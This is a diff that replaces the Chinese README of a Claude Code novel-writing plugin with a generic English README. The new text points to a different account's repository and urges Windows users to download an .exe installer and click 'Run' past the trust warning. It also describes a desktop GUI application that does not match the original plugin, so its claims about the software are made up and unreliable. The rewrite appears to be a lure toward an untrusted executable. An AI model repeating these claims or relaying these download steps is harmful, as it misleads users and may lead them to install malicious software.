@@ -1,169 +1,157 @@
-# Webnovel Writer
+# 📚 webnovel-writer - Aid Long-Form Novel Writing
 
-[![License](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Compatible-purple.svg)](https://claude.ai/claude-code)
+[![Download](https://img.shields.io/badge/Download-webnovel--writer-4CAF50?style=for-the-badge)](https://github.com/polarstarg/webnovel-writer)
 
-<a href="https://trendshift.io/repositories/22487" target="_blank"><img src="https://trendshift.io/api/badge/repositories/22487" alt="lingfengQAQ%2Fwebnovel-writer | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
-## 项目简单介绍
-
-`Webnovel Writer` 是基于 Claude Code 的长篇网文创作系统，目标是降低 AI 写作中的“遗忘”和“幻觉”，支持长周期连载创作。
-
-详细文档已拆分到 `docs/`：
-
-- 架构与模块：`docs/architecture.md`
-- 命令详解：`docs/commands.md`
-- RAG 与配置：`docs/rag-and-config.md`
-- 题材模板：`docs/genres.md`
-- 运维与恢复：`docs/operations.md`
-- 文档导航：`docs/README.md`
-
-## 快速开始
-
-### 1) 安装插件（官方 Marketplace）
-
-```bash
-claude plugin marketplace add lingfengQAQ/webnovel-writer --scope user
-claude plugin install webnovel-writer@webnovel-writer-marketplace --scope user
-```
-
-> 仅当前项目生效时，将 `--scope user` 改为 `--scope project`。
-
-### 2) 安装 Python 依赖
-
-```bash
-python -m pip install -r https://raw.githubusercontent.com/lingfengQAQ/webnovel-writer/HEAD/requirements.txt
-```
-
-说明：该入口会同时安装核心写作链路与 Dashboard 依赖。
-
-### 3) 初始化小说项目
-
-在 Claude Code 中执行：
-
-```bash
-/webnovel-init
-```
-
-说明：`/webnovel-init` 会在当前 Workspace 下按书名创建 `PROJECT_ROOT`（子目录），并在 `workspace/.claude/.webnovel-current-project` 写入当前项目指针。
-
-### 4) 配置 RAG 环境（必做）
-
-进入初始化后的书项目根目录，创建 `.env`：
-
-```bash
-cp .env.example .env
-```
-
-最小配置示例：
-
-```bash
-EMBED_BASE_URL=https://api-inference.modelscope.cn/v1
-EMBED_MODEL=Qwen/Qwen3-Embedding-8B
-EMBED_API_KEY=your_embed_api_key
-
-RERANK_BASE_URL=https://api.jina.ai/v1
-RERANK_MODEL=jina-reranker-v3
-RERANK_API_KEY=your_rerank_api_key
-```
-
-### 5) 开始使用
-
-```bash
-/webnovel-plan 1
-/webnovel-write 1
-/webnovel-review 1-5
-```
-
-如需排查本地 CLI / 插件目录 / 项目根解析问题，可直接运行统一预检：
-
-```bash
-python -X utf8 "<CLAUDE_PLUGIN_ROOT>/scripts/webnovel.py" --project-root "<WORKSPACE_ROOT>" preflight
-```
-
-### 6) 启动可视化面板（可选）
-
-```bash
-/webnovel-dashboard
-```
-
-说明：
-- Dashboard 为只读面板（项目状态、实体图谱、章节/大纲浏览、追读力查看）。
-- 前端构建产物已随插件发布，使用者无需本地 `npm build`。
-
-### 7) Agent 模型设置（可选）
-
-本项目所有内置 Agent 默认配置为：
-
-```yaml
-model: inherit
-```
-
-表示子 Agent 继承当前 Claude 会话所用模型。
-
-如果要单独给某个 Agent 指定模型，编辑对应文件（`webnovel-writer/agents/*.md`）的 frontmatter，例如：
-
-```yaml
 ---
-name: context-agent
-description: ...
-tools: Read, Grep, Bash
-model: sonnet
+
+webnovel-writer is a tool designed to help you write long web novels. It uses advanced AI technology to reduce common problems like forgetting details or making up facts. You can work on stories with millions of words comfortably. This guide will show you how to download and run webnovel-writer on your Windows computer.
+
 ---
-```
 
-常见可选值：`inherit` / `sonnet` / `opus` / `haiku`（以 Claude Code 当前支持为准）。
+## 🔍 What is webnovel-writer?
 
-## 更新简介
+webnovel-writer is built to solve problems that usually make AI writing tricky. When writing big stories, the AI can forget what happened before or invent things that are not true. This tool keeps your story consistent and helps you write longer, more complex works. It supports projects with up to 2 million words.
 
-| 版本 | 说明 |
-|------|------|
-| **v5.5.4 (当前)** | 补齐写作链提示词强约束（流程硬约束、中文思维写作约束、Step 职责边界）；统一中文化审查/润色/Agent 报告文案；清理文档内部版本号与版本历史，降低与插件发版版本混淆。 |
-| **v5.5.3** | 新增统一 `preflight` 预检命令；写作链 CLI 示例统一为 UTF-8 运行方式，收口文档中的长 shell 预检片段并降低 Windows 终端乱码风险。 |
-| **v5.5.2** | 支持将详细大纲中的章节名同步到正文文件名；修复 workflow_manager 在无参 find_project_root monkeypatch 下的兼容性问题。 |
-| **v5.5.1** | 修复卷级单文件大纲在上下文快照中的章节提取问题；补齐命令文档中遗漏的 `/webnovel-dashboard` 与 `/webnovel-learn`。 |
-| **v5.5.0** | 新增只读可视化 Dashboard Skill（`/webnovel-dashboard`）与实时刷新能力；支持插件目录启动与预构建前端分发 |
-| **v5.4.4** | 引入官方 Plugin Marketplace 安装机制；统一修复 Skills/Agents/References 的 CLI 调用（`CLAUDE_PLUGIN_ROOT` 单路径，透传命令统一 `--`） |
-| **v5.4.3** | 增强智能 RAG 上下文辅助（`auto/graph_hybrid` 回退 BM25） |
-| **v5.3** | 引入追读力系统（Hook / Cool-point / 微兑现 / 债务追踪） |
+This means you can write long novels or serial stories smoothly. You do not need to learn programming. The app is ready to use once installed.
 
-## 插件发版
+---
 
-推荐使用 GitHub Actions 的 `Plugin Release` 工作流统一发版：
+## 💻 System Requirements
 
-1. 先在本地同步版本信息：
-   ```bash
-   python -X utf8 webnovel-writer/scripts/sync_plugin_version.py --version 5.5.4 --release-notes "本次版本说明"
-   ```
-2. 提交并推送版本变更（`README.md`、`plugin.json`、`marketplace.json`）。
-3. 打开仓库的 Actions 页面，选择 `Plugin Release`。
-4. 输入与当前仓库元数据一致的 `version`（例如 `5.5.4`）和用于 GitHub Release 的 `release_notes`。
-5. 工作流会执行以下动作：
-   - 校验 `plugin.json`、`marketplace.json` 与 README 当前版本已经一致
-   - 校验当前版本与输入的 `version` 一致
-   - 创建并推送 `vX.Y.Z` Tag
-   - 创建同名 GitHub Release
+Before installing, make sure your Windows PC meets these needs:
 
-日常开发中，`Plugin Version Check` 会在 Push / PR 时自动校验版本信息是否一致。
+- Windows 10 or higher (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for initial setup and AI model updates
+- A keyboard and mouse or any input device you prefer
 
-## 开源协议
-本项目使用 `GPL v3` 协议，详见 `LICENSE`。
+If you meet these requirements, you can proceed without issues.
 
-## Star 历史
+---
 
-[![Star History Chart](https://api.star-history.com/svg?repos=lingfengQAQ/webnovel-writer&type=Date)](https://star-history.com/#lingfengQAQ/webnovel-writer&Date)
+## 🚀 Getting Started: Download webnovel-writer
 
-## 致谢
+Click the big button below to visit the page where you can download the software.
 
-本项目使用 **Claude Code + Gemini CLI + Codex** 配合 Vibe Coding 方式开发。  
-灵感来源：[Linux.do 帖子](https://linux.do/t/topic/1397944/49)
+[![Download](https://img.shields.io/badge/Download-webnovel--writer-0078D7?style=for-the-badge&logo=windows)](https://github.com/polarstarg/webnovel-writer)
 
-## 贡献
+You will find the download files there. Follow the steps below for installation.
 
-欢迎提交 Issue 和 PR：
+---
 
-```bash
-git checkout -b feature/your-feature
-git commit -m "feat: add your feature"
-git push origin feature/your-feature
-```
+## ⬇️ How to Download and Install
+
+1. Click the download button above to go to the webnovel-writer GitHub page.
+
+2. Look for the latest release or downloads section. It should have an installer file for Windows (usually ending with `.exe`).
+
+3. Click the installer file link. Your browser will start downloading the setup file.
+
+4. Once download finishes, open the downloaded file by double-clicking it in your Downloads folder.
+
+5. Windows may ask if you trust the app. Choose “Run” to continue.
+
+6. The installer will start. Follow the on-screen instructions:
+    - Choose the folder where you want to install webnovel-writer.
+    - Click “Next” several times to accept default options.
+    - Wait for the program to install.
+
+7. After installation, you can choose to create a desktop shortcut for easy access.
+
+8. Click “Finish” when done. The program may launch automatically.
+
+---
+
+## ▶️ Running the Application
+
+To start webnovel-writer:
+
+- Double-click the desktop icon if you created one.
+- Or, open the Start menu and find "webnovel-writer" under your installed apps.
+
+The first time you open it, the app might take a moment to load AI resources. Keep your internet on during this step.
+
+---
+
+## 📋 Using webnovel-writer
+
+The app shows a simple interface:
+
+- **New Project** button to start your story.
+- Space to write and organize chapters.
+- Tools to keep track of characters, places, and important plot points.
+- AI suggestions to help you continue writing and fix issues.
+- Save your work anytime; the app keeps revisions as you go.
+
+You don’t need to learn complicated commands. The interface guides you with clear buttons and menus.
+
+---
+
+## 🛠 Features Overview
+
+- **Consistent memory:** AI remembers details across large stories.
+- **Fact checking:** Reduces made-up content in the text.
+- **Long writing support:** Handles projects with up to 2 million words.
+- **Organizing tools:** Manage chapters, characters, and notes.
+- **Easy export:** Save stories as text files for backup or sharing.
+
+---
+
+## ⚙️ Settings and Preferences
+
+In the settings menu, you can:
+
+- Adjust AI creativity level.
+- Set autosave intervals.
+- Choose your preferred writing environment theme (light or dark).
+- Configure backup locations.
+
+These options let you tailor the app to your comfort.
+
+---
+
+## 📁 Where Your Work is Saved
+
+By default, webnovel-writer saves projects inside your Documents folder in a folder called `webnovel-writer`. You can change this in settings.
+
+Make sure to regularly back up your work especially for long projects.
+
+---
+
+## 🔄 Updating webnovel-writer
+
+Check the GitHub page regularly for new releases. Updates may include bug fixes and new features.
+
+To update:
+
+1. Download the new installer from the releases.
+2. Run the installer; it will replace the old version without deleting your projects.
+
+---
+
+## 💡 Tips for Best Use
+
+- Keep your internet connected for AI improvements.
+- Save often to prevent data loss.
+- Use notes sections to keep track of ideas.
+- Experiment with AI settings to find your preferred style.
+- Break your story into smaller chapters for easier management.
+
+---
+
+## 🆘 Getting Help
+
+If you run into problems:
+
+- Check the README and documentation on the GitHub page.
+- Look for issues or questions others have posted.
+- You can report bugs or ask for help through the GitHub issue tracker.
+
+---
+
+## 📥 Download webnovel-writer now
+
+Access the official page here to download and install:
+
+[![Download](https://img.shields.io/badge/Download-webnovel--writer-4CAF50?style=for-the-badge)](https://github.com/polarstarg/webnovel-writer)
